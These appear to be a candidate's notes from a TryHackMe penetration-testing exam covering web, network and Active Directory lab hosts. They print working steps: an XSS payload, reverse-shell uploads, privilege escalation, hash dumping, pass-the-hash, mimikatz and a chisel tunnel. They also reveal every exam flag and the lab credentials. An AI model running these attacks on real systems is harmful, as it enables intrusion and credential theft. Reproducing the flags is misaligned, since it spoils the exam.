# Web Part

![[Pasted image 20250714154639.png]]

### In-Scope

- Assessment target: **http://10.200.150.100/**
- The application makes use of a supporting API that is in-scope as well.

### Out-of-Scope

- Any systems or domains not explicitly listed above
- Backend infrastructure (unless accessible via the web application)
- Phishing or social engineering attacks
- As this is an active client network, any denial-of-service attacks or aggressive attacks/scans aimed at causing service disruptions
- The VPN server: 10.200.150.250
### Deliverables

You must submit a professional penetration testing report that includes the following elements:

- Report Summary: Executive-level overview and key findings
- 4 Vulnerability writeups each containing the following detail:
    - Vulnerability Name
    - Risk Rating (Abstracted CVSS Score)
    - Flag Value
    - Description of vulnerability and how it was identified
    - Remediation actions to resolve the root cause of the vulnerability

**Note:** Only vulnerabilities that produce flags will be eligible for scoring. Only the first instance of a specific vulnerability type will award points. If you identify a vulnerability but are unable to fully exploit it to receive the flag value, you can submit the vulnerability without the flag for partial credit.

As an example:

- You managed to find an SQL injection vulnerability, exploit and retrieve the flag. - You get full points for this submission.
- The second vulnerability you find is XSS, but are unable to retrieve the flag. You get partial credit.
- If your third submission is another SQL injection vulnerability, even if it is in a different part of the application, you will receive 0 points for it.

### Scoring

This section of the assessment has a total of 400 points distributed as follows:

- 20 points reserved for the report summary
- 380 points divided across the 4 vulnerabilities

Due to time constraints with going live, TryBankMe wants to focus on very specific vulnerabilities. As such, not all vulnerabilities should be reported on or will award you points in the exam. Furthermore, multiple findings of the same vulnerability will only award you points once.

The following vulnerabilities should be focused on and are worth 95 points each:

- Cross Site Scripting (XSS)
- Cross Site Request Forgery (CSRF)
- SQL Injection
- Command Injection
- Unrestricted File Upload
- Arbitrary File Read
- Path Traversal
- Server-Side Request Forgery
- Server-Side Template Injection
- XML External Entity Injection (XXE)
- Mass Assignment
- Insecure Authentication Mechanism
- Broken Access Control
- Broken Business Logic
- Race Condition
- Sensitive Information Disclosure
- Open Redirect

### Flags

TryBankMe values both identification and exploitation of vulnerabilities. In order to help you understand if you have found an impactful vulnerability, TryBankMe has embedded flags in the application. While you may consider some of your findings vulnerabilities, TryBankMe will only consider those that produce a flag for points for the exam.

Flags will automatically appear in the server response if you successfully exploit a vulnerability. In some cases, a vulnerability may be partial, delivering one half of the flag. You can find the vulnerability pair by matching the middle value of the UUID to make one complete flag value. As an example:

- Partial flag 1 - THM{ece436bb-b8ab-4b63
- Partial flag 2 - 4b63-ab71-5f663add5b5a}

4b63 shows the two partial flags are a pair to create the complete flag value, which will be `THM{ece436bb-b8ab-4b63-ab71-5f663add5b5a}`

In the event that you have identified a vulnerability but are unable to gather the flag, you can still submit the vulnerability to receive partial points.

### Client-Side Vulnerabilities

For client-side vulnerabilities, such as Cross-Site Scripting, TryBankMe has a security engineer on call that can verify your finding. In order to verify your finding, please provide the username and password of the account that your client-side attack targets. Your client-side attack should add a new cookie with the name `XSS` and the value `XSS` to the target's browser session. Once ready, you can provide these credentials to the TryBankMe security engineer by making the following cURL request:

`curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "target_username", "password" : "target_password" }' http://10.200.150.100:8080/api/v1.0/xss`

If the security engineer verifies your finding, the flag value will be returned.

**Note:** Make sure that your target account only has one item. For example, if you find XSS in the card feature, your target should only have one card to avoid the security engineer from using the wrong account and therefore not verifying your finding. You may have to create a new target user to ensure only one time.

```bash
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy
```

> [! Important]
> Create 2 sold accounts v1 & v2 apply for a transaction from v1 to v2(5bb79282-a2f0-450e-9387-e2a8266d05ce) for \$1.0 and boom the flag will appear after you inject the XSS script

```bash
<img src=x onerror=(document.cookie="XSS=XSS")/>

curl -H 'Content-Type: application/json' -X POST -d '{"username":"hafedhguenichi","password":"hafedhguenichi"}' http://10.200.150.100:8080/api/v1.0/xss

{
  "flag": "THM{8ad25ee1-2e77-4a82-9e14-7a5cc524c9fb}",
  "message": "XSS Success"
}
```

> [!SUCCESS]
> Sending negative transaction amount from an account to another in the same user account

```bash
POST /api/v1.0/transaction HTTP/1.1
Host: 10.200.150.100:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhZmVkaGd1ZW5pY2hpMSIsInJvbGUiOjAsImV4cCI6MTc1MjU0MTEzNn0.AOmM1LHKQGdvoSxmdYgfNj3kjwj0_KJ8DCZNRZPd_rc
Content-Length: 132
Origin: http://10.200.150.100
Connection: keep-alive
Referer: http://10.200.150.100/

{"account_from":"425e126f-c209-47c0-a504-3261166017ad","account_to":"5bb79282-a2f0-450e-9387-e2a8266d05ce","amount":-1,"message":""}


------------


HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Tue, 15 Jul 2025 00:52:36 GMT
Content-Type: application/json
Content-Length: 328
Access-Control-Allow-Origin: http://10.200.150.100
Vary: Origin
Connection: close

{"details":{"account_from":"425e126f-c209-47c0-a504-3261166017ad","account_to":"5bb79282-a2f0-450e-9387-e2a8266d05ce","amount":-1,"date":"Tue, 15 Jul 2025 00:52:36 GMT","message":"","transactionNumber":"ba524851-08cf-4f90-bfeb-ed5eac29b238"},"flag":"THM{4e57e20b-0f3c-4bf5-af21-206d05531c41}","message":"Transaction performed"}
```


# Network Part

![[Pasted image 20250714131436.png]]

### In-Scope

Assessment Targets:

- 10.200.150.151 - Windows
- 10.200.150.152 - Linux

Testing should be performed from the internal network perspective. Both initial access and privilege escalation are in-scope.

### Out-of-Scope

- Any systems or domains not explicitly listed above
- Backend infrastructure (unless accessible via the web application)
- Phishing or social engineering attacks
- As this is an active client network, any denial-of-service attacks or aggressive attacks/scans aimed at causing service disruptions
- The VPN server: 10.200.150.250

> [!TIP]
> Your machine **(ATTACKBOX)** IP Address: **10.10.91.199**

## Delivberable

You must submit a professional penetration testing report that includes the following elements:

- Report Summary: Executive-level overview and key findings
- 4 Vulnerability writeups each containing the following detail:
    - Vulnerability Name
    - Risk Rating (Abstracted CVSS Score)
    - Flag Value
    - Description of vulnerability and how it was identified
    - Remediation actions to resolve the root cause of the vulnerability

**Note:** Only vulnerabilities that produce flags will be eligible for scoring. Each host has an initial access and privilege escalation flag. For Linux the flags can be found in `/user.txt` and `/root/root.txt` for privileged access and for Windows the flags can be found in `C:\user.txt` and `C:\Users\Administrator\root.txt`. Only the first instance of a specific vulnerability type will award points. If you identify a vulnerability but are unable to fully exploit it to receive the flag value, you can submit the vulnerability without the flag for partial credit.

### Breach Reporting

For initial access (breach), the following vulnerabilities can be chosen:

- Outdated Software
- Default Software Configuration
- Misconfigured Service Configuration
- SQL Injection (Custom App)
- Command Injection (Custom App)
- Unrestricted File Upload (Custom App)
- Arbitrary File Read (Custom App)

In the event that a publicly known software product or service is vulnerable, one of the first 3 vulnerability names should be chosen. In the event that a custom TryBankMe application is vulnerable, one of the last 4 vulnerability names should be chosen.

### PrivEsc Reporting

For privilege escalation (privesc), the following vulnerabilities can be chosen:

- Outdated Software
- Insecure File Permissions
- Insecure Path Configuration
- Insecure Crontab/Service/Scheduled Task Configuration
- Insecure Sudo/SUID Configuration
- Insecure Capability/Privilege Configuration
- Insecure Registry Configuration

### Scoring

This section of the assessment has a total of 360 points distributed as follows:

- 20 points reserved for the report summary
- 340 points divided across the 4 vulnerabilities

An equal amount of points are awarded for the initial access and privilege escalation components.

```bash
nmap -sCV -p- -T4 10.200.150.152 -v

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.13)
|_http-favicon: Unknown favicon MD5: BEF5682BB6E7DECC9F1D4A62A0747E0D
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/2.0.3 Python/3.10.13
| http-title: D-Tale
|_Requested resource was /dtale/main/1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

---------

nmap -sCV -p- -T4 10.200.150.151 -v

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: PicShare - Home
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN
|   NetBIOS_Domain_Name: WIN
|   NetBIOS_Computer_Name: WIN
|   DNS_Domain_Name: win
|   DNS_Computer_Name: win
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-14T14:09:02+00:00
| ssl-cert: Subject: commonName=win
| Not valid before: 2025-04-06T11:56:02
|_Not valid after:  2025-10-06T11:56:02
|_ssl-date: 2025-07-14T14:09:10+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Windows Host

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.250.1.6 LPORT=4444 -f aspx -o shell.aspx

cp shell.aspx a.aspx.png

"Intercept and send to repeater with burpsuite then remove the .png extension, the file will not be visible in the UserUploads/ directory -> UserUploads/a.aspx "

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.250.1.6
set LPORT 4444
run


meterpreter > cat c:/user.txt
THM{ec6ad7f0-0dfe-45a6-8cd8-5fa5479e4cd6}
```

```bash
getprivs
load icognito
list_tokens (no tokens available)
impersonate_token "NT AUTHORITY\Authenticated Users"
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > sysinfo
Computer        : WIN
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getpid
Current pid: 1256
eterpreter > getpid explorer
Current pid: 1256
meterpreter > ps 

Process List
============

 PID   PPID  Name              Arch  Session  User                          Path
 ---   ----  ----              ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System            x64   0
 84    4     Registry          x64   0
 252   596   svchost.exe       x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 280   4     smss.exe          x64   0
 332   596   svchost.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 340   596   svchost.exe       x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 372   524   LogonUI.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 376   368   csrss.exe         x64   0
 380   524   dwm.exe       


meterpreter > cat C:/Users/Administrator/root.txt
THM{0e486aeb-28fd-45cf-bb35-39f2128c0dbb}
```

##### CVE-2025-0655 – Remote Code Execution in D-Tale via Unprotected Custom Filters

  
CVE-2025-0655 (now rejected as a duplicate of CVE-2024-55890) originally identified a critical remote code execution (RCE) vulnerability in the D-Tale data visualization tool, specifically affecting version 3.15.1. The flaw allowed unauthenticated attackers to execute arbitrary system commands by enabling a global setting and abusing an exposed API endpoint.

- **CVE ID**: CVE-2025-0655
- **Severity**: Critical
- **CVSS Score**: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **EPSS Score**: 85.91%
- **Published**: January 8, 2025
- **Affected Versions**: 3.15.1
- **Patched Version**: 3.16.1

```bash
msf > use exploit/linux/http/dtale_rce_cve_2025_0655
msf exploit(dtale_rce_cve_2025_0655) > show targets
    ...targets...
msf exploit(dtale_rce_cve_2025_0655) > set TARGET <target-id>
msf exploit(dtale_rce_cve_2025_0655) > show options
    ...configure RHOSTS, RPORT, etc...
msf exploit(dtale_rce_cve_2025_0655) > set RHOSTS <ip>
msf exploit(dtale_rce_cve_2025_0655) > set RPORT <port>
msf exploit(dtale_rce_cve_2025_0655) > run
```

meterpreter > cat /user.txt
THM{852e4e9d-7ba2-4609-9975-81bc5ffa0972}


meterpreter > sudo -l
[-] Unknown command: sudo. Run the help command for more details.
meterpreter > shell
Process 349903 created.
Channel 2 created.
id
uid=1001(tony) gid=1001(tony) groups=1001(tony),100(users)      
bash -i
tony@lin1:/opt/dtale$ sudo -l
Matching Defaults entries for tony on lin1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User tony may run the following commands on lin1:
    (ALL) NOPASSWD: /usr/bin/strace
(gtfobins)
tony@lin1:/opt/dtale$ sudo strace -o /dev/null /bin/sh
sudo strace -o /dev/null /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cd  
cat root.txt
THM{32006219-472c-44ec-957c-e9bc0f303b2d}


# Active Directory Part

![[Pasted image 20250714162505.png]]

### In-Scope

Assessment Targets:

- **10.200.150.10 - AD Domain Controller**
- **10.200.150.20 - Standard domain-joined server/workstation**

Testing should be performed from the internal network perspective.

### Out-of-Scope

- Any systems or domains not explicitly listed above
- Backend infrastructure (unless accessible via the web application)
- Phishing or social engineering attacks
- As this is an active client network, any denial-of-service attacks or aggressive attacks/scans aimed at causing service disruptions
- The VPN server: **10.200.150.250**

### Deliverables

You must submit a professional penetration testing report that includes the following elements:

- Report Summary: Executive-level overview and key findings
- Per host a writeup containing the following detail:
    - Flag value
    - Step-by-step description of attack path followed to compromise the host
    - Remediation actions to resolve the vulnerabilities exploited in the attack path

No risk ratings or vulnerability-level reporting is required for this section as the focus is on misconfiguration identification and exploit paths.

**Note:** Only vulnerabilities that produce flags will be eligible for scoring. Each host has a flag to be found.

In Active Directory environments:

- Workstations (WRK): Flags can be found at `C:\flag.txt`
- Domain Controllers (DC): Flags can be found at `C:\flag.txt`

Make sure to collect all flags to maximize your score.

### Scoring

This section of the assessment has a total of 240 points distributed as follows:

- 20 points reserved for the report summary
- 220 points divided across the 2 host compromises

An equal amount of points are awarded for both hosts in this pentest.

```bash
root@ip-10-10-159-29:~# nmap -sCV -p135,139,445,3389 10.200.150.20

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TRYHACKME
|   NetBIOS_Domain_Name: TRYHACKME
|   NetBIOS_Computer_Name: WRK
|   DNS_Domain_Name: tryhackme.loc
|   DNS_Computer_Name: WRK.tryhackme.loc
|   DNS_Tree_Name: tryhackme.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-14T15:27:33+00:00
| ssl-cert: Subject: commonName=WRK.tryhackme.loc
| Not valid before: 2025-04-09T09:59:17
|_Not valid after:  2025-10-09T09:59:17
|_ssl-date: 2025-07-14T15:27:40+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-14T15:27:37
|_  start_date: N/A


root@ip-10-10-143-2:~# nmap 10.200.150.10

PORT   STATE SERVICE
53/tcp open  domain
```
```bash
enum4linux-ng -A 10.200.150.20
 ==========================================
|    SMB Dialect Check on 10.200.150.20    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 ============================================================
|    Domain Information via SMB session for 10.200.150.20    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: WRK
NetBIOS domain name: TRYHACKME
DNS domain: tryhackme.loc
FQDN: WRK.tryhackme.loc
Derived membership: domain member
Derived domain: TRYHACKME
```

```bash
root@ip-10-10-159-29:~# smbclient -L //10.200.150.20/ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Safe            Disk      
SMB1 disabled -- no workgroup available

root@ip-10-10-159-29:~# smbclient //10.200.150.20/Safe -N
smb> recuse on
smb> ls
smb> mget * (yes)
smb> exit

7z x creds.zip (failed need echo password)
zip2john creds.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Passw0rd         (creds.zip/creds.txt)
```

```bash
root@ip-10-10-159-29:~# cat creds.txt 
John VerySafePassword!

evil-winrm -i 10.200.150.20 -u "John" -p "VerySafePassword!"
PS C:\Users\john\Documents> cat c:/flag.txt
THM{196f88d8-e185-4da1-aad3-7a993ed47565}
```

```bash
*Evil-WinRM* PS C:\Users\john\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
**SeBackupPrivilege**             Back up files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```


```bash
reg.exe save HKLM\SAM C:\Users\John\sam.bak (Privs are limited)
reg.exe save HKLM\SYSTEM C:\Users\John\system.bak

download sam.bak
download system.bak

apt install python3-impacket
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

[*] Target system bootKey: 0xfa0661c3eee8696eeb436f2bafa060e7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f2cc94578e916022e179e7e6f3a5ac5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31f66c1b86:::

```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 WRK
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-70000-00000-AA429
Original Install Date:     02/04/2025, 17:30:30
System Boot Time:          14/07/2025, 13:15:00
System Manufacturer:       Amazon EC2
System Model:              t3.medium
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
BIOS Version:              Amazon EC2 1.0, 16/10/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,036 MB
Available Physical Memory: 3,255 MB
Virtual Memory: Max Size:  4,740 MB
Virtual Memory: Available: 4,085 MB
Virtual Memory: In Use:    655 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    tryhackme.loc
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB4514366
                           [02]: KB4512577
                           [03]: KB4512578
Network Card(s):           1 NIC(s) Installed.
                           [01]: Amazon Elastic Network Adapter
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.200.150.1
                                 IP address(es)
                                 [01]: 10.200.150.20
                                 [02]: fe80::919b:26fe:7097:5a66
                                 
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```bash
use exploit/windows/smb/psexec
set RHOSTS 10.200.150.20
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:1f2cc94578e916022e179e7e6f3a5ac5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.250.1.6
run

load kiwi
execute -f mimikatz.exe -H
meterpreter > execute -f mimikatz.exe -H
Process 2576 created.

shell
mimikatz.exe

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain     NTLM                              SHA1
--------  ------     ----                              ----
WRK$      TRYHACKME  7a1e779683fdd9d687eaa42b12a471bf  0f99c42ed0cbdcae2dad55444f8cbf78211dea09

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
WRK$      TRYHACKME  (null)

kerberos credentials
====================

Username  Domain         Password
--------  ------         --------
(null)    (null)         (null)
WRK$      tryhackme.loc  88 e7 ab 14 c6 a1 5c f9 06 65 f6 7d 20 06 f3 70 29 a6 dd 63 3f 5f be ca 65 ab b9 4a c1 90 f2 77 b7 58 f1 a1 39 e8 1c 88 87 32 dd a9 e2 fc 69 43 1f d7 ad ee 25 f9 85 fe 6a 8c a5 46 5b 1c c7 b1 e8 6a 02 07 78 7
                         0 6e d1 2d 61 68 2d 0c a3 83 50 31 7f ae 5c af 26 41 78 6f 0e e1 b2 75 91 75 6f 56 e1 10 25 c3 33 cf 7b cb e9 b3 36 58 f9 c4 4e 24 96 85 d0 35 ad 20 3f 02 a8 7a dc 93 93 db 00 d2 ce 3b 4d 9b aa 1c d3 b2 33 44
                          d3 5f 08 24 6c fc ba 5d 1b 44 c2 3a 1a 98 0c cd 4b d6 fd c0 f3 65 ec 76 dd 17 8e 3f 7d 90 a8 41 5c 08 21 26 6b 83 af b9 58 09 dc 95 b5 c1 6c 90 21 16 03 e3 fd fd 54 2d 39 53 4e 13 55 d5 85 eb 39 fa bd 24 40
                         6f 16 e5 dc b3 e3 cb eb 0d 74 de da f3 c1 5e 43 3b d4 28 c0 2a 91 15 00 5e d7 a8 49 50 8d 15 52
wrk$      TRYHACKME.LOC  (null)
```

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz
```
```bash
root@ip-10-10-143-2:~# chisel server -p 8000 --reverse --socks5
2025/07/15 14:38:50 server: Reverse tunnelling enabled
2025/07/15 14:38:50 server: Fingerprint kmyXKk9EoIxTWGpvyl2PCf+r6Be4K3a6TC9PRpsGYgA=
2025/07/15 14:38:50 server: Listening on http://0.0.0.0:8000
2025/07/15 14:40:14 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash
chisel.exe client 10.250.1.6:8000 R:socks
nano /etc/proxychains.conf 
socks5 1270.0.0.1 1080
```

```bash
root@ip-10-10-143-2:~# proxychains nxc smb 10.200.150.10 -u "John" -p "VerySafePassword!" --users
```

| #   | **Username**        | Last PW Set         |
| --- | ------------------- | ------------------- |
| 1   | **Administrator**   | 2025-07-14 20:55:06 |
| 2   | **Guest**           | 2025-04-10 18:47:04 |
| 3   | **krbtgt**          | 2025-04-02 15:14:22 |
| 4   | **t1_r.conway**     | 2025-04-16 14:58:16 |
| 5   | **t2_j.baker**      | 2025-04-16 14:58:18 |
| 6   | **t2_b.bolton**     | 2025-04-16 14:58:18 |
| 7   | **t2_g.clarke**     | 2025-04-16 14:58:18 |
| 8   | **t2_n.marsh**      | 2025-04-16 14:58:20 |
| 9   | **t1_n.marsh**      | 2025-04-16 14:58:20 |
| 10  | **t1_j.hutchinson** | 2025-04-16 14:58:21 |
| 11  | **t2_m.taylor**     | 2025-04-16 14:58:21 |
| 12  | **d.reynolds**      | 2025-04-16 15:04:07 |
| 13  | **l.williams**      | 2025-04-16 15:04:07 |
| 14  | **d.dawson**        | 2025-04-16 15:04:07 |
| 15  | **g.brown**         | 2025-04-16 15:04:07 |
| 16  | **a.singh**         | 2025-04-16 15:04:07 |
| 17  | **c.potter**        | 2025-04-16 15:04:07 |
| 18  | **s.lucas**         | 2025-04-16 15:04:07 |
| 19  | **john**            | 2025-04-24 06:54:34 |
| 20  | **r.conway**        | 2025-04-16 15:04:07 |
| 21  | **m.robinson**      | 2025-04-16 15:04:07 |
| 22  | **h.smith**         | 2025-04-16 15:04:07 |
| 23  | **s.thompson**      | 2025-04-16 15:04:07 |
| 24  | **l.carr**          | 2025-04-16 15:04:07 |
| 25  | **e.lewis**         | 2025-04-16 15:04:08 |
| 26  | **c.chapman**       | 2025-04-16 15:04:08 |
| 27  | **k.fraser**        | 2025-04-16 15:04:08 |
| 28  | **j.cook**          | 2025-04-16 15:04:08 |
| 29  | **c.thomas**        | 2025-04-16 15:04:08 |
| 30  | **m.ford**          | 2025-04-16 15:04:08 |
| 31  | **p.fleming**       | 2025-04-16 15:04:08 |
| 32  | **b.warren**        | 2025-04-16 15:04:08 |
| 33  | **a.pritchard**     | 2025-04-16 15:04:08 |
| 34  | **j.lawrence**      | 2025-04-16 15:04:08 |
| 35  | **h.porter**        | 2025-04-16 15:04:08 |
| 36  | **n.grant**         | 2025-04-16 15:04:08 |
| 37  | **d.white**         | 2025-04-16 15:04:08 |
| 38  | **k.johnson**       | 2025-04-16 15:04:08 |
| 39  | **a.hewitt**        | 2025-04-16 15:04:08 |
| 40  | **j.collins**       | 2025-04-16 15:04:08 |
| 41  | **g.knowles**       | 2025-04-18 15:35:18 |
| 42  | **d.perry**         | 2025-04-16 15:04:09 |
| 43  | **b.reid**          | 2025-04-16 15:04:09 |
| 44  | **j.shah**          | 2025-04-16 15:04:09 |
| 45  | **g.roberts**       | 2025-04-16 15:04:09 |
| 46  | **n.smith**         | 2025-04-16 15:04:09 |
| 47  | **j.baker**         | 2025-04-16 15:04:09 |
| 48  | **b.bolton**        | 2025-04-16 15:04:09 |
| 49  | **m.martin**        | 2025-04-16 15:04:09 |
| 50  | **g.duncan**        | 2025-04-16 15:04:09 |
| 51  | **p.green**         | 2025-04-16 15:04:09 |
| 52  | **a.bell**          | 2025-04-16 15:04:09 |
| 53  | **s.parkin**        | 2025-04-16 15:04:09 |
| 54  | **a.taylor**        | 2025-04-16 15:04:09 |
| 55  | **r.hall**          | 2025-04-16 15:04:09 |
| 56  | **c.richardson**    | 2025-04-16 15:04:09 |
| 57  | **g.clarke**        | 2025-04-16 15:04:09 |
| 58  | **g.king**          | 2025-04-16 15:04:10 |
| 59  | **t.jenkins**       | 2025-04-16 15:04:10 |
| 60  | **d.begum**         | 2025-04-16 15:04:10 |
| 61  | **d.webster**       | 2025-04-16 15:04:10 |
| 62  | **s.greenwood**     | 2025-04-16 15:04:10 |
| 63  | **l.grant**         | 2025-04-16 15:04:10 |
| 64  | **k.douglas**       | 2025-04-16 15:04:10 |
| 65  | **k.ward**          | 2025-04-16 15:04:10 |
| 66  | **v.sanderson**     | 2025-04-16 15:04:10 |
| 67  | **t.wallis**        | 2025-04-16 15:04:10 |
| 68  | **m.murray**        | 2025-04-16 15:04:10 |
| 69  | **d.davies**        | 2025-04-16 15:04:10 |
| 70  | **d.morrison**      | 2025-04-16 15:04:10 |
| 71  | **s.lee**           | 2025-04-16 15:04:10 |
| 72  | **l.robinson**      | 2025-04-16 15:04:10 |
| 73  | **j.burke**         | 2025-04-16 15:04:10 |
| 74  | **j.phillips**      | 2025-04-17 23:07:31 |
| 75  | **m.abbott**        | 2025-04-16 15:04:11 |
| 76  | **h.williams**      | 2025-04-16 15:04:11 |
| 77  | **a.manning**       | 2025-04-16 15:04:11 |
| 78  | **j.norton**        | 2025-04-16 15:04:11 |
| 79  | **m.ford1**         | 2025-04-16 15:04:11 |
| 80  | **r.stevens**       | 2025-04-16 15:04:11 |
| 81  | **g.holmes**        | 2025-04-16 15:04:11 |
| 82  | **p.farrell**       | 2025-04-16 15:04:11 |
| 83  | **f.henry**         | 2025-04-16 15:04:11 |
| 84  | **t.hooper**        | 2025-04-16 15:04:11 |
| 85  | **p.osborne**       | 2025-04-16 15:04:11 |
| 86  | **a.field**         | 2025-04-16 15:04:11 |
| 87  | **d.rhodes**        | 2025-04-16 15:04:11 |
| 88  | **b.harrison**      | 2025-04-16 15:04:11 |
| 89  | **d.davies1**       | 2025-04-16 15:04:11 |
| 90  | **d.smith**         | 2025-04-16 15:04:11 |
| 91  | **n.chandler**      | 2025-04-16 15:04:11 |
| 92  | **a.jackson**       | 2025-04-16 15:04:12 |
| 93  | **n.marsh**         | 2025-04-16 15:04:12 |
| 94  | **s.mitchell**      | 2025-04-16 15:04:12 |
| 95  | **j.johnson**       | 2025-04-16 15:04:12 |
| 96  | **b.anderson**      | 2025-04-16 15:04:12 |
| 97  | **j.begum**         | 2025-04-16 15:04:12 |
| 98  | **h.phillips**      | 2025-04-16 15:04:12 |
| 99  | **g.price**         | 2025-04-16 15:04:12 |
| 100 | **j.gardner**       | 2025-04-16 15:04:12 |
| 101 | **o.morton**        | 2025-04-16 15:04:12 |
| 102 | **j.hutchinson**    | 2025-04-16 15:04:12 |
| 103 | **v.adams**         | 2025-04-16 15:04:12 |
| 104 | **m.taylor**        | 2025-04-16 15:04:12 |
